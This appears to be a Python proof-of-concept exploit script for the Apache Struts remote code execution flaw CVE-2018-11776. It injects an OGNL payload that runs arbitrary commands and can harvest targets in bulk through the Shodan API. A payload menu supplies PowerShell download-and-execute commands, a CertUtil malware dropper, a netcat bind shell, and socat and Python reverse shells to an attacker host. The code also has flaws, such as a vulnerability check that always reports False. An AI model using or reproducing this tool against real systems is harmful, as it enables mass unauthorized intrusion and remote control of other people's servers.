import re
import os
import sys
import json
import time
import urllib
import argparse

import requests

requests.packages.urllib3.disable_warnings()

__author__ = "Ekultek"
__twitter__ = "@stay__salty"
__description__ = "PoC for CVE-2018-11776 with Shodan ;)"


try:
    raw_input
except:
    input = raw_input


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument("-H", "--host", dest="hostTarget", metavar="IP", help="pass a host to target")
        parser.add_argument("-a", "--agent", dest="userAgent", metavar="AGENT", help="pass a User-Agent")
        parser.add_argument("-p", "--proxy", dest="proxyToUse", metavar="PROXY", help="pass a proxy")
        parser.add_argument("-s", "--shodan", dest="shodanKey", metavar="API-KEY", help="pass your shodan API key")
        parser.add_argument("-q", "--query", dest="searchQuery", metavar="QUERY", help="pass a search query")
        parser.add_argument("-t", "--path", dest="targetPath", metavar="PATH", help="provide a path to the target")
        parser.add_argument("-c", "--connect", dest="connectShodan", action="store_true", default=False,
                            help="connect to Shodan API and find hosts")
        parser.add_argument("-C", "--command", dest="commandToExecute", metavar="COMMAND",
                            help="pass a command to execute")
        return parser.parse_args()


def create_payload(command):
    """
    generate the payload for the URL
    payload discovered by jas502n (https://github.com/jas502n/St2-057)
    """
    payload = "${(#_memberAccess[\"allowStaticMethodAccess\"]=true,"
    payload += "#a=@java.lang.Runtime@getRuntime().exec(\"{}\").getInputStream(),".format(command)
    payload += "#b=new java.io.InputStreamReader(#a),"
    payload += "#c=new java.io.BufferedReader(#b),#d=new char[51020],"
    payload += "#c.read(#d),#sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
    payload += "#sbtest.println(#d),#sbtest.close())}/actionChain1.action"
    return urllib.quote_plus(payload).replace("%2F", "/")


def get_page(url, payload, proxy=None, user_agent=None):
    """
    check if the URL is vulnerable or not
    """
    session = requests.session()
    session.proxies = {"http": proxy, "https": proxy}
    session.headers["User-Agent"] = user_agent
    payloaded_url = "{}{}".format(url, payload)
    print payloaded_url
    retval = {"host": url, "injection point": payloaded_url}
    try:
        req = session.get(payloaded_url, verify=False, timeout=5)
        time.sleep(1.7)  # need to sleep to give execution time to run
        status = req.status_code
        if status == 302:
            retval["is vulnerable"] = True
        retval["is vulnerable"] = False
    except Exception:
        retval["is vulnerable"] = False
    return retval


def convert_url(host):
    """
    add http:// to the URL
    """
    checker = re.compile(r"http(s)?.//")
    if checker.search(host) is not None:
        retval = "http://{}".format(host.split("://")[-1])
    else:
        retval = "http://{}".format(host)
    return retval


def shodan_search(api_key, query):
    """
    search Shodan for targets
    """
    shodan_url = "https://api.shodan.io/shodan/host/search?key={token}&query={query}"
    discovered_hosts = set()
    error_retval = None
    try:
        req = requests.get(shodan_url.format(token=api_key, query=query))
        json_data = json.loads(req.content)
        for match in json_data["matches"]:
            discovered_hosts.add(match["ip_str"])
        return discovered_hosts
    except Exception:
        return error_retval


def pwn():
    # Clear screen
    if 'win32' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    # Payloads
    selection = """\n
+----+-----+----+--------------------------+
| ID | Platform |            Type          |
+----+----------+--------------------------+
| 01 | Windows  | Reverse HTTP Meterpreter |
| 02 | Windows  | Power-Up Priv Escalation |
| 03 | Windows  | CertUtil Malware Dropper |
| 04 |  *Nix    | Netcat Bind TCP Shell    |
| 05 |  *Nix    | Socat Reverse Shell	   |
| 06 |  *Nix    | Python Reverse TCP Shell |
+----+----------+--------------------------+

Input Payload ID(Single Digit) or 'Q' to quit this menu.

"""
    print selection
    try:
        while True:
            choice = raw_input("<INPUT> : ")
            if choice == '1':
                # Reverse HTTP Meterpreter
                # TODO:/ doesn't work yet
                LHOST = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
                LPORT = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
                payload = "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".format(LHOST, LPORT)
                print ("[+] Done. Reverse HTTP Meterpreter selected.")
            elif choice == '2':
                # Retrieve and execute PowerShell script aimed at privilege escalation
                print ("[+] Power-Up, Priv-Esc payload selected.")
                payload =  "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
            elif choice == '3':
                # Stager leveraging CertUtil
                print ("[!] Please provide the exact URL to your remote payload. In example;")
                print ("http://staging-server.com/evil.exe\n")
                URI = raw_input("<URL> : ")
                payload = "certutil.exe -urlcache -split -f {0} google_https_cert.exe && google_https_cert.exe".format(URI)
                print ("[+] Done. CertUtil stager selected.")
            elif choice == '4':
                # Netcat Bind
                RPORT = raw_input("Please provide the PORT you want Netcat to bind to: ")
                payload = "nc -lvp {0} -e /bin/sh".format(RPORT)
                print ("[+] Done, Netcat Bind selected.")
            elif choice == '5':
                # Socat based Reverse TCP Shell
                # Socat listener -> socat file:`tty`,raw,echo=0 tcp-listen:LPORT
                LHOST = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
                LPORT = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
                payload = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}".format(LHOST, LPORT)
                print ("[+] Done, Socat Reverse Shell selected.")
            elif choice == '6':
                # Python Reverse TCP Shell

                LHOST = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
                LPORT = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
                payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(
                    LHOST, LPORT)

                print ("[+] Done, Python Reverse Shell selected.")
            elif 'Q' or 'q' in choice:
                print ("[!] Quitting menu.")
                time.sleep(2)
                break
            else:
                print ("[!] Unhandled Option.")

            return payload

    except KeyboardInterrupt:
        print("[!] User quit")


def check_opts(opts):
    """
    check all the arguments and create a dict to use for the arguments
    """
    retval = {}
    if opts.hostTarget is None and not opts.connectShodan:
        print("[!] no target supplied `-H` and no Shodan connection supplied `-c`")
        exit(-1)
    if opts.connectShodan and opts.shodanKey is None:
        print("[!] no Shodan API key supplied `-s <KEY>`")
        exit(-1)
    if opts.targetPath is None:
        print("[!] no path provided on target defaulting to '/struts2-showcase/', this will likely fail")
        retval["path"] = "/struts2-showcase/"
    else:
        retval["path"] = opts.targetPath
    if opts.userAgent is None:
        retval["agent"] = (
            "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) "
            "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100"
        )
    else:
        retval["agent"] = opts.userAgent
        print("[+] configuring User-Agent: '{}'".format(opts.userAgent))
    if opts.proxyToUse is None:
        retval["proxy"] = None
    else:
        print("[+] configuring proxy: {}".format(opts.proxyToUse))
        retval["proxy"] = opts.proxyToUse
    if opts.searchQuery is None:
        retval["query"] = "struts"
    else:
        print("[+] using provided query: '{}'".format(opts.searchQuery))
        retval["query"] = opts.searchQuery
    if opts.commandToExecute is None:

        print("[!] No command was supplied. Select a pre-defined secondary payload?")
        choice = raw_input("[Y]es/[No]: ").lower()

        if choice.startswith('y'):
            retval["command"] = pwn()
        else:
            print("[!] no payload was loaded, defaulting to `calc`")
            retval["command"] = "calc"

    else:
        print("[+] configuring command: '{}'".format(opts.commandToExecute))
        retval["command"] = opts.commandToExecute
    return retval


def boxxy(text):
    """
    create a box around some text
    """
    lines = text.splitlines()
    width = max(len(s) for s in lines) + 1
    res = ["+" + "-" * width + "+"]
    for s in lines:
        res.append("|" + (s + " " * width)[:width] + "|")
    res.append("+" + "-" * width + "+")
    print("\n".join(res))


def configure_results(results):
    print("\nHost: {}\nExecuted URL: {}\nVulnerable: {}\n".format(
        results["host"],
        results["injection point"] if results["is vulnerable"] else "n/a",
        "Yes" if results["is vulnerable"] else "No"
    ))


def main():
    """
    main function
    """
    boxxy("-Author: {}\n--Twitter: {}\n---Description: {}\n".format(__author__, __twitter__, __description__))
    print("\n")
    opts = Parser().optparse()
    arguments = check_opts(opts)
    if opts.connectShodan:
        print("[+] pulling hosts from Shodan API")
        hosts = list(shodan_search(opts.shodanKey, arguments["query"]))
    if opts.hostTarget is not None:
        hosts = [opts.hostTarget]
    print("[+] checking a total of {} hosts\n".format(len(hosts)))
    for i, host in enumerate(hosts, start=1):
        print("[+] checking for CVE-2018-11776 on '{}' ({})".format(host, i))
        host = convert_url(host)
        host = "{}{}".format(host, arguments["path"])
        payload = create_payload(arguments["command"])
        results = get_page(host, payload, proxy=arguments["proxy"], user_agent=arguments["agent"])
        configure_results(results)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[!] user quit")
